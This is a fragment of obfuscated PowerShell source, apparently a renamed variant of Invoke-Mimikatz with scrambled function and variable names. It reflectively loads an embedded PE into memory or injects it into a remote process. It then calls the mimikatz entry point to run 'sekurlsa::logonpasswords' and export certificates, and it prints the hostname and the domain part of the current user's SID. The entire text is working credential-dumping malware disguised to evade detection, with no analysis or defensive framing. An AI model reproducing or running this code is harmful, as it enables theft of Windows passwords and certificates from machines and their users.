        $PEInfo = unofficially -KspyWyNs99 $KspyWyNs99 -EdirUAaY99 $EdirUAaY99 -Win32Constants $Win32Constants
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$QjekBmVX99 = Ute ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ErtDGziO99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($QjekBmVX99, [Type]$EdirUAaY99.IMAGE_IMPORT_DESCRIPTOR)
                
                if ($ErtDGziO99.Characteristics -eq 0 `
                        -and $ErtDGziO99.FirstThunk -eq 0 `
                        -and $ErtDGziO99.ForwarderChain -eq 0 `
                        -and $ErtDGziO99.Name -eq 0 `
                        -and $ErtDGziO99.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }
                $eZEVgzSU99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Ute ([Int64]$PEInfo.PEHandle) ([Int64]$ErtDGziO99.Name)))
                $qkFEEaWO99 = $iAJTLnuo99.GetModuleHandle.Invoke($eZEVgzSU99)
                if ($qkFEEaWO99 -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $eZEVgzSU99. Continuing anyways" -WarningAction Continue
                }
                
                $OIWYYWxv99 = $iAJTLnuo99.FreeLibrary.Invoke($qkFEEaWO99)
                if ($OIWYYWxv99 -eq $false)
                {
                    Write-Warning "Unable to free library: $eZEVgzSU99. Continuing anyways." -WarningAction Continue
                }
                
                $QjekBmVX99 = Ute ($QjekBmVX99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EdirUAaY99.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $vUvjXIAy99 = Ute ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $slPWlPdP99 = invoke @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $mLAWFiyE99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vUvjXIAy99, $slPWlPdP99)
        
        $mLAWFiyE99.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $OIWYYWxv99 = $iAJTLnuo99.VirtualFree.Invoke($KspyWyNs99, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($OIWYYWxv99 -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }
    Function Main
    {
        $iAJTLnuo99 = illustrate
        $EdirUAaY99 = Canberra
        $Win32Constants =  Thursdays
        
        $lFbCkSOL99 = [IntPtr]::Zero
    
        if (($VIKrIEhk99 -ne $null) -and ($VIKrIEhk99 -ne 0) -and ($QJdJIgvP99 -ne $null) -and ($QJdJIgvP99 -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($QJdJIgvP99 -ne $null -and $QJdJIgvP99 -ne "")
        {
            $pmjluMFB99 = @(Get-Process -Name $QJdJIgvP99 -ErrorAction SilentlyContinue)
            if ($pmjluMFB99.Count -eq 0)
            {
                Throw "Can't find process $QJdJIgvP99"
            }
            elseif ($pmjluMFB99.Count -gt 1)
            {
                $NKEdCCrG99 = Get-Process | where { $_.Name -eq $QJdJIgvP99 } | Select-Object ProcessName, Id, SessionId
                Write-Output $NKEdCCrG99
                Throw "More than one instance of $QJdJIgvP99 found, please specify the process ID to inject in to."
            }
            else
            {
                $VIKrIEhk99 = $pmjluMFB99[0].ID
            }
        }
        
        
        if (($VIKrIEhk99 -ne $null) -and ($VIKrIEhk99 -ne 0))
        {
            $lFbCkSOL99 = $iAJTLnuo99.OpenProcess.Invoke(0x001F0FFF, $false, $VIKrIEhk99)
            if ($lFbCkSOL99 -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $VIKrIEhk99"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        
        Write-Verbose "Calling facial"
        try
        {
            $dIpSrUmz99 = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if ($dIpSrUmz99 -is [array])
        {
            $hlktqyRY99 = $dIpSrUmz99[0]
        } else {
            $hlktqyRY99 = $dIpSrUmz99
        }
        if ( ( $hlktqyRY99.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $hlktqyRY99.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$xyBDLqMD99 = [Byte[]][Convert]::FromBase64String($ByznnlSm99)
        }
        else
        {
            [Byte[]]$xyBDLqMD99 = [Byte[]][Convert]::FromBase64String($vQbBuDkG99)
        }
        $xyBDLqMD99[0] = 0
        $xyBDLqMD99[1] = 0
        $KspyWyNs99 = [IntPtr]::Zero
        if ($lFbCkSOL99 -eq [IntPtr]::Zero)
        {
            $fYwJKOpk99 = facial -xyBDLqMD99 $xyBDLqMD99 -ZfBwWbof99 $ZfBwWbof99
        }
        else
        {
            $fYwJKOpk99 = facial -xyBDLqMD99 $xyBDLqMD99 -ZfBwWbof99 $ZfBwWbof99 -lFbCkSOL99 $lFbCkSOL99
        }
        if ($fYwJKOpk99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $KspyWyNs99 = $fYwJKOpk99[0]
        $PxHGeVET99 = $fYwJKOpk99[1] #only matters if you loaded in to a remote process
        
        
        $PEInfo = unofficially -KspyWyNs99 $KspyWyNs99 -EdirUAaY99 $EdirUAaY99 -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($lFbCkSOL99 -eq [IntPtr]::Zero))
        {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$MDkXSxjp99 = driveway -KspyWyNs99 $KspyWyNs99 -FunctionName "powershell_reflective_mimikatz"
                    if ($MDkXSxjp99 -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $sBrUitAo99 = invoke @([IntPtr]) ([IntPtr])
                    $ggzGZayL99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MDkXSxjp99, $sBrUitAo99)
                    $BmbKtseI99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ZfBwWbof99)
                    [IntPtr]$HnldHtWO99 = $ggzGZayL99.Invoke($BmbKtseI99)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BmbKtseI99)
                    if ($HnldHtWO99 -eq [IntPtr]::Zero)
                    {
                        Throw "Unable to get output, Output Ptr is NULL"
                    }
                    else
                    {
                        $kwYQAdBe99 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($HnldHtWO99)
                        Write-Output $kwYQAdBe99
                        $iAJTLnuo99.LocalFree.Invoke($HnldHtWO99);
                    }
        }
        elseif (($PEInfo.FileType -ieq "DLL") -and ($lFbCkSOL99 -ne [IntPtr]::Zero))
        {
            $uXayErnJ99 = driveway -KspyWyNs99 $KspyWyNs99 -FunctionName "VoidFunc"
            if (($uXayErnJ99 -eq $null) -or ($uXayErnJ99 -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $uXayErnJ99 = creaking $uXayErnJ99 $KspyWyNs99
            $uXayErnJ99 = Ute $uXayErnJ99 $PxHGeVET99
            
            $TUBSeZNh99 = aggravation -eXFgjlah99 $lFbCkSOL99 -StartAddress $uXayErnJ99 -iAJTLnuo99 $iAJTLnuo99
        }
        
        if ($lFbCkSOL99 -eq [IntPtr]::Zero)
        {
            crimsons -KspyWyNs99 $KspyWyNs99
        }
        else
        {
            $OIWYYWxv99 = $iAJTLnuo99.VirtualFree.Invoke($KspyWyNs99, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($OIWYYWxv99 -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }
    Main
}
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $BGmDEAeV99  = "Continue"
    }
    
    Write-Verbose "PowerShell ProcessID: $PID"
    
    if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
    {
        $ZfBwWbof99 = "sekurlsa::logonpasswords exit"
    }
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $ZfBwWbof99 = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $ZfBwWbof99 = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
    if ($ixChYeXp99 -eq $null -or $ixChYeXp99 -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $lZzZZVGP99 -ArgumentList @($ByznnlSm99, $vQbBuDkG99, "Void", 0, "", $ZfBwWbof99)
    }
    else
    {
        Invoke-Command -ScriptBlock $lZzZZVGP99 -ArgumentList @($ByznnlSm99, $vQbBuDkG99, "Void", 0, "", $ZfBwWbof99) -ixChYeXp99 $ixChYeXp99
    }
}
$parts = $(whoami /user)[-1].split(" ")[1];
$ExKkzgpz99 = $parts.split('-');
$ZVFECuFw99 = $([System.Net.Dns]::GetHostByName(($env:computerName)).HostName);
$YlSXJyIb99 = $ExKkzgpz99[0..($ExKkzgpz99.Count-2)] -join '-';
$ULugkiBC99 = Main;
"Hostname: $ZVFECuFw99 / $YlSXJyIb99";
$ULugkiBC99
}